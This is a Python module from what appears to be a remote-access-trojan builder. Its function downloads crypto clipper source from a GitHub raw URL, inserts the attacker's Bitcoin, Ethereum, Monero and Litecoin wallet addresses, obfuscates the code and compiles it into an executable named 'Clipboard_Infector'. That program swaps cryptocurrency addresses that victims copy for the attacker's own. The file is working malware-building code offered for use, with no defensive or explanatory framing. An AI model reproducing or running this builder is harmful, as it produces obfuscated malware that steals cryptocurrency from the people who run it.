import os, shutil, requests
from cookies_package import *
from util.plugins.common import clear, cleanup, compile
from colorama import Fore

fileName = "Clipboard_Infector"

def Create_Crypto_Clipper(btc, eth, mon, ltc):
    clear()
    try:
        '''
        Write source to file and replace the webhook
        '''
        r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/builder/assets/crypto_clipper_addon.py").text.replace("BTC_WALLET_HERE", btc).replace("ETH_WALLET_HERE", eth).replace("MONERO_WALLET_HERE", mon).replace("LTC_WALLET_HERE", ltc)
        with open(f"{fileName}.py", "w") as f: f.write(r)
        f.close()

        obfusacate(f"{fileName}.py")   # Obfuscate the file

        print(f"{Fore.CYAN}\nCreating Clipboard Infector named {Fore.GREEN}{fileName}{Fore.CYAN}.exe\n{Fore.RESET}")
        compile(fileName)   # Compile the file to executable
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")   # Move the executable from dist folder to the current directory
        cleanup(fileName)   # Cleanup the files

    except Exception as e:
        print(f"{Fore.RED}Error while creating checker: \n\n{Fore.RESET}{e}")
        cleanup(fileName)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
        return

    print(f"\n{Fore.GREEN}Clipboard Infector Created{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.RESET}Enter anything to continue. . .  {Fore.WHITE}')